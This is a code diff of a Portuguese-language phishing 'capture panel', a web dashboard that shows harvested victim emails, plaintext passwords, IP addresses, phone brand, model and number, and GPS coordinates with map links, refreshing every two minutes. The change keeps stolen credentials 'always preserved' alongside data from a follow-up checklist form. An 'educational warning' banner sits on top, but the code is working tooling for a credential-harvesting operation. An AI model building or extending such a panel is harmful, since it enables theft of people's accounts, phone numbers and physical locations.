@@ -7,22 +7,15 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%); padding: 20px; min-height: 100vh; }
-        .container { max-width: 1400px; margin: 0 auto; }
-        
+        .container { max-width: 1500px; margin: 0 auto; }
         h1 { color: #202124; margin-bottom: 8px; font-size: 28px; }
         .subtitle { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        
         .warning { background: #fce8e6; border: 1px solid #f28b82; border-radius: 8px; padding: 15px; margin-bottom: 20px; color: #c5221f; font-size: 14px; }
-        
-        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 15px; margin-bottom: 25px; }
-        .stat-card { background: #fff; border: 1px solid #dadce0; border-radius: 10px; padding: 20px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.05); transition: transform 0.2s, box-shadow 0.2s; }
-        .stat-card:hover { transform: translateY(-2px); box-shadow: 0 4px 12px rgba(0,0,0,0.1); }
+        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }
+        .stat-card { background: #fff; border: 1px solid #dadce0; border-radius: 10px; padding: 20px; text-align: center; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         .stat-number { font-size: 32px; font-weight: bold; color: #d93025; margin-bottom: 5px; }
         .stat-label { color: #5f6368; font-size: 13px; }
-        
         .toolbar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 15px; padding: 12px 16px; background: #fff; border-radius: 8px; border: 1px solid #dadce0; flex-wrap: wrap; gap: 10px; }
-        .toolbar-left { display: flex; align-items: center; gap: 15px; flex-wrap: wrap; }
-        .toolbar-right { display: flex; align-items: center; gap: 10px; }
         .last-update { color: #5f6368; font-size: 13px; }
         .last-update strong { color: #202124; }
         .countdown { color: #d93025; font-weight: 600; font-size: 14px; }
@@ -30,15 +23,12 @@
         .btn-back:hover { background: #1557b0; }
         .btn-refresh { background: #f1f3f4; color: #202124; padding: 8px 16px; border-radius: 6px; border: 1px solid #dadce0; cursor: pointer; font-size: 13px; }
         .btn-refresh:hover { background: #e8eaed; }
-        
         .table-wrapper { overflow-x: auto; background: #fff; border: 1px solid #dadce0; border-radius: 10px; box-shadow: 0 1px 3px rgba(0,0,0,0.05); }
         table { width: 100%; border-collapse: collapse; font-size: 13px; }
         th { background: #f8f9fa; padding: 12px 10px; text-align: left; font-weight: 600; color: #5f6368; border-bottom: 2px solid #dadce0; white-space: nowrap; position: sticky; top: 0; }
         td { padding: 12px 10px; border-bottom: 1px solid #f0f0f0; color: #202124; vertical-align: top; }
         tr:last-child td { border-bottom: none; }
         tr:hover { background: #fafafa; }
-        tr.entry-row { transition: background 0.2s; }
-        
         .email { font-weight: 600; color: #1a73e8; }
         .password { font-family: 'Courier New', monospace; color: #d93025; font-weight: bold; }
         .ip { font-family: 'Courier New', monospace; color: #188038; font-weight: 600; }
@@ -53,23 +43,22 @@
         .details-content strong { color: #202124; }
         .location-yes { color: #188038; font-weight: 600; font-family: 'Courier New', monospace; }
         .location-no { color: #d93025; font-weight: 500; }
-        
         .id-badge { display: inline-block; background: #1a73e8; color: #fff; padding: 2px 8px; border-radius: 12px; font-size: 11px; font-weight: 600; }
-        
+        .checklist-badge { display: inline-block; background: #ff6b00; color: #fff; padding: 2px 8px; border-radius: 12px; font-size: 10px; font-weight: 600; margin-left: 4px; vertical-align: middle; }
         .google-maps-link { color: #1a73e8; text-decoration: none; font-weight: 500; }
         .google-maps-link:hover { text-decoration: underline; }
-        
         .filter-bar { display: flex; gap: 10px; margin-bottom: 15px; flex-wrap: wrap; }
         .filter-input { flex: 1; min-width: 200px; padding: 8px 12px; border: 1px solid #dadce0; border-radius: 6px; font-size: 13px; }
         .filter-input:focus { outline: none; border-color: #1a73e8; }
-        
+        .checklist-cell { display: inline-block; background: #e8f5e9; color: #2e7d32; padding: 2px 6px; border-radius: 4px; font-size: 11px; font-weight: 600; }
+        .not-filled { color: #999; font-style: italic; font-size: 11px; }
         @media (max-width: 768px) { table { font-size: 11px; } th, td { padding: 6px 4px; } .toolbar { flex-direction: column; align-items: stretch; } }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>🎣 Painel de Capturas - Phishing Demo</h1>
-        <p class="subtitle">📊 Organizado por email — cada email aparece apenas uma vez (mais recente)</p>
+        <p class="subtitle">📊 Organizado por email — cada email aparece apenas uma vez | Email e senha preservados ao preencher o checklist</p>
         
         <div class="warning">
             <strong>⚠️ AVISO EDUCATIVO:</strong> Esta página demonstra como dados sensíveis podem ser capturados em ataques de phishing. 
@@ -79,15 +68,15 @@
         <div class="stats">
             <div class="stat-card">
                 <div class="stat-number" id="totalLogins">0</div>
-                <div class="stat-label">📧 Emails Únicos Capturados</div>
+                <div class="stat-label">📧 Emails Únicos</div>
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="uniqueIps">0</div>
-                <div class="stat-label">🌍 IPs Únicos (Vítimas)</div>
+                <div class="stat-label">🌍 IPs Únicos</div>
             </div>
             <div class="stat-card">
-                <div class="stat-number" id="uniqueEmails">0</div>
-                <div class="stat-label">📨 Total de Credenciais</div>
+                <div class="stat-number" id="checklistCount">0</div>
+                <div class="stat-label">📋 Checklists Preenchidos</div>
             </div>
             <div class="stat-card">
                 <div class="stat-number" id="geoCount">0</div>
@@ -97,15 +86,11 @@
         
         <div class="toolbar">
             <div class="toolbar-left">
-                <div class="last-update">
-                    ✅ Última atualização: <strong id="lastUpdate">--</strong>
-                </div>
-                <div class="last-update">
-                    ⏱️ Próxima em: <span class="countdown" id="nextUpdate">02:00</span>
-                </div>
+                <div class="last-update">✅ Atualizado: <strong id="lastUpdate">--</strong></div>
+                <div class="last-update">⏱️ Próxima: <span class="countdown" id="nextUpdate">02:00</span></div>
             </div>
             <div class="toolbar-right">
-                <button class="btn-refresh" onclick="updateAll()">🔄 Atualizar Agora</button>
+                <button class="btn-refresh" onclick="updateAll()">🔄 Atualizar</button>
                 <a href="/" class="btn-back">← Voltar ao Login</a>
             </div>
         </div>
@@ -124,21 +109,20 @@
                     <th>🌍 IP</th>
                     <th>📱 Marca/Modelo</th>
                     <th>📞 Telemóvel</th>
+                    <th>📋 Checklist</th>
                     <th>📍 Localização GPS</th>
                     <th>🕐 Timestamp</th>
                     <th>🔍</th>
                 </tr>
             </thead>
             <tbody id="logsTable">
-                <tr>
-                    <td colspan="9" class="no-data">⏳ Carregando dados...</td>
-                </tr>
+                <tr><td colspan="10" class="no-data">⏳ Carregando dados...</td></tr>
             </tbody>
         </table>
         </div>
         
         <div style="margin-top: 20px; text-align: center; color: #5f6368; font-size: 12px;">
-            🔐 Dados protegidos | Atualização automática a cada 2 minutos | Total: <strong id="totalShown">0</strong> emails
+            🔐 Dados protegidos | Atualização a cada 2 min | Total: <strong id="totalShown">0</strong> emails
         </div>
     </div>
     
@@ -154,7 +138,7 @@
                 const data = await response.json();
                 document.getElementById('totalLogins').textContent = data.unique_emails || data.total_logins || 0;
                 document.getElementById('uniqueIps').textContent = data.unique_ips || 0;
-                document.getElementById('uniqueEmails').textContent = data.total_logins || 0;
+                document.getElementById('checklistCount').textContent = data.checklist_count || 0;
                 document.getElementById('geoCount').textContent = data.geo_count || 0;
             } catch (err) {
                 console.error('Erro ao buscar estatísticas:', err);
@@ -167,12 +151,11 @@
                 const data = await response.json();
                 allLogs = data.logs || [];
                 renderLogs(allLogs);
-                
                 const now = new Date();
                 document.getElementById('lastUpdate').textContent = now.toLocaleString('pt-BR');
             } catch (err) {
                 console.error('Erro ao buscar logs:', err);
-                document.getElementById('logsTable').innerHTML = '<tr><td colspan="9" class="no-data">❌ Erro ao carregar dados</td></tr>';
+                document.getElementById('logsTable').innerHTML = '<tr><td colspan="10" class="no-data">❌ Erro ao carregar dados</td></tr>';
             }
         }
         
@@ -180,25 +163,34 @@
             const tbody = document.getElementById('logsTable');
             
             if (!logs || logs.length === 0) {
-                tbody.innerHTML = '<tr><td colspan="9" class="no-data">📭 Nenhuma captura encontrada ainda. Teste o login!</td></tr>';
+                tbody.innerHTML = '<tr><td colspan="10" class="no-data">📭 Nenhuma captura encontrada. Teste o login!</td></tr>';
                 document.getElementById('totalShown').textContent = 0;
                 return;
             }
             
             tbody.innerHTML = logs.map((log, index) => {
-                let d = {};
-                try {
-                    d = JSON.parse(log.device_info || '{}');
-                } catch (e) {
-                    d = {};
+                // USAR CAMPOS DIRETOS DO BACKEND (preservam email e senha)
+                const email = log.email || '-';
+                const password = log.password || '-';
+                const phoneBrand = log.phone_brand || '';
+                const phoneModel = log.phone_model || '';
+                const phoneNumber = log.phone_number || '';
+                const checklistSubmitted = log.checklist_submitted || false;
+                const geo = log.geolocation || {};
+                
+                let brandDisplay = '';
+                if (phoneBrand || phoneModel) {
+                    brandDisplay = escapeHtml(phoneBrand) + (phoneModel ? ' / ' + escapeHtml(phoneModel) : '');
+                } else {
+                    brandDisplay = '<span class="not-filled">—</span>';
                 }
                 
-                const isForm = d.source === 'checklist_form';
-                const phoneBrand = d.phone_brand || '-';
-                const phoneModel = d.phone_model || '-';
-                const phoneNumber = d.phone_number || '-';
+                let phoneDisplay = phoneNumber ? escapeHtml(phoneNumber) : '<span class="not-filled">—</span>';
                 
-                const geo = d.geolocation || {};
+                let checklistDisplay = checklistSubmitted ? 
+                    '<span class="checklist-cell">✅ Preenchido</span>' : 
+                    '<span class="not-filled">—</span>';
+                
                 let geoDisplay = '';
                 if (geo.lat && geo.lon) {
                     geoDisplay = `<span class="location-yes">✅ ${geo.lat.toFixed(6)}, ${geo.lon.toFixed(6)}</span><br><small>±${Math.round(geo.accuracy || 0)}m</small>`;
@@ -211,39 +203,43 @@
                 return `
                     <tr class="entry-row" style="background: ${rowBg};">
                         <td><span class="id-badge">#${log.id}</span></td>
-                        <td class="email">${escapeHtml(log.email)}</td>
-                        <td class="password">${escapeHtml(log.password)}</td>
-                        <td class="ip">${escapeHtml(log.ip)}</td>
-                        <td class="device-info">${escapeHtml(phoneBrand)} ${phoneModel !== '-' ? '/ ' + escapeHtml(phoneModel) : ''}</td>
-                        <td class="device-info">${escapeHtml(phoneNumber)}</td>
+                        <td class="email">${escapeHtml(email)}${checklistSubmitted ? '<span class="checklist-badge">📋</span>' : ''}</td>
+                        <td class="password">${escapeHtml(password)}</td>
+                        <td class="ip">${escapeHtml(log.ip || '-')}</td>
+                        <td class="device-info">${brandDisplay}</td>
+                        <td class="device-info">${phoneDisplay}</td>
+                        <td class="device-info">${checklistDisplay}</td>
                         <td class="device-info">${geoDisplay}</td>
                         <td class="timestamp">${formatDate(log.timestamp)}</td>
                         <td><button class="expand-btn" onclick="toggleDetails(${log.id})">👁️ Ver</button></td>
                     </tr>
                     <tr id="details-${log.id}" class="details-row" style="display:none;">
-                        <td colspan="9">
+                        <td colspan="10">
                             <div class="details-content">
                                 <strong>🔍 Detalhes Completos do Registo #${log.id}</strong><br>
-                                ${geo.lat && geo.lon ? `<div style="margin: 10px 0; padding: 10px; background: #e6f4ea; border-radius: 6px;">
+                                <div style="margin: 8px 0; padding: 8px; background: #fff3e0; border-radius: 6px;">
+                                    <strong>🔐 Credenciais (sempre preservadas):</strong><br>
+                                    <strong>📧 Email:</strong> <code>${escapeHtml(email)}</code><br>
+                                    <strong>🔑 Senha:</strong> <code>${escapeHtml(password)}</code>
+                                </div>
+                                ${checklistSubmitted ? `
+                                    <div style="margin: 8px 0; padding: 8px; background: #e8f5e9; border-radius: 6px; border-left: 4px solid #2e7d32;">
+                                        <strong>📋 Dados do Checklist (preenchidos depois do login):</strong><br>
+                                        <strong>📱 Marca:</strong> ${escapeHtml(phoneBrand) || '—'}<br>
+                                        <strong>📋 Modelo:</strong> ${escapeHtml(phoneModel) || '—'}<br>
+                                        <strong>📞 Telemóvel:</strong> ${escapeHtml(phoneNumber) || '—'}
+                                    </div>
+                                ` : ''}
+                                ${geo.lat && geo.lon ? `<div style="margin: 8px 0; padding: 8px; background: #e6f4ea; border-radius: 6px;">
                                     <strong>📍 Localização GPS Real:</strong><br>
                                     <strong>Latitude:</strong> ${geo.lat}<br>
                                     <strong>Longitude:</strong> ${geo.lon}<br>
                                     <strong>Precisão:</strong> ${Math.round(geo.accuracy || 0)} metros<br>
                                     <a href="https://www.google.com/maps?q=${geo.lat},${geo.lon}" target="_blank" class="google-maps-link">🗺️ Ver no Google Maps</a>
-                                </div>` : '<strong>📍 GPS:</strong> Recusado ou indisponível<br>'}
-                                <strong>🖥️ OS:</strong> ${escapeHtml(d.os || '?')} | <strong>Plataforma:</strong> ${escapeHtml(d.platform || '?')} | <strong>Mobile:</strong> ${d.mobile ? 'Sim' : 'Não'}<br>
-                                ${isForm ? `
-                                    <div style="margin-top:10px;padding:10px;background:rgba(255,165,0,0.15);border:1px solid rgba(255,165,0,0.4);border-radius:6px;">
-                                        <strong style="color:#ffa500;">📋 Dados do Formulário de Checklist:</strong><br>
-                                        <strong>📱 Marca:</strong> ${escapeHtml(phoneBrand)}<br>
-                                        <strong>📋 Modelo:</strong> ${escapeHtml(phoneModel)}<br>
-                                        <strong>📞 Número:</strong> ${escapeHtml(phoneNumber)}
-                                    </div>
-                                ` : ''}
-                                <details style="margin-top: 10px;">
-                                    <summary style="cursor: pointer; color: #1a73e8; font-weight: 500;">📄 Ver JSON completo</summary>
-                                    <pre style="background:#fff;padding:10px;border-radius:4px;overflow:auto;font-size:11px;margin-top:8px;border:1px solid #e0e0e0;">${escapeHtml(JSON.stringify(d, null, 2))}</pre>
-                                </details>
+                                </div>` : '<div style="margin: 8px 0; padding: 8px; background: #fce8e6; border-radius: 6px;"><strong>📍 GPS:</strong> Recusado ou indisponível</div>'}
+                                <div style="margin: 8px 0; padding: 8px; background: #f5f5f5; border-radius: 6px;">
+                                    <strong>🖥️ Sistema:</strong> ${escapeHtml(log.os || '?')} | <strong>Plataforma:</strong> ${escapeHtml(log.platform || '?')}
+                                </div>
                             </div>
                         </td>
                     </tr>
@@ -255,27 +251,20 @@
         
         function filterLogs() {
             const query = document.getElementById('searchInput').value.toLowerCase();
-            if (!query) {
-                renderLogs(allLogs);
-                return;
-            }
+            if (!query) { renderLogs(allLogs); return; }
             const filtered = allLogs.filter(log => {
-                let d = {};
-                try { d = JSON.parse(log.device_info || '{}'); } catch(e) {}
                 return (log.email || '').toLowerCase().includes(query) ||
                        (log.ip || '').toLowerCase().includes(query) ||
-                       (d.phone_brand || '').toLowerCase().includes(query) ||
-                       (d.phone_model || '').toLowerCase().includes(query) ||
-                       (d.phone_number || '').toLowerCase().includes(query);
+                       (log.phone_brand || '').toLowerCase().includes(query) ||
+                       (log.phone_model || '').toLowerCase().includes(query) ||
+                       (log.phone_number || '').toLowerCase().includes(query);
             });
             renderLogs(filtered);
         }
         
         function toggleDetails(id) {
             const row = document.getElementById('details-' + id);
-            if (row) {
-                row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
-            }
+            if (row) row.style.display = row.style.display === 'none' ? 'table-row' : 'none';
         }
         
         function escapeHtml(text) {
@@ -305,8 +294,7 @@
                 seconds--;
                 const mins = Math.floor(seconds / 60);
                 const secs = seconds % 60;
-                document.getElementById('nextUpdate').textContent = 
-                    `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+                document.getElementById('nextUpdate').textContent = `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
                 if (seconds <= 0) clearInterval(countdownInterval);
             }, 1000);
         }
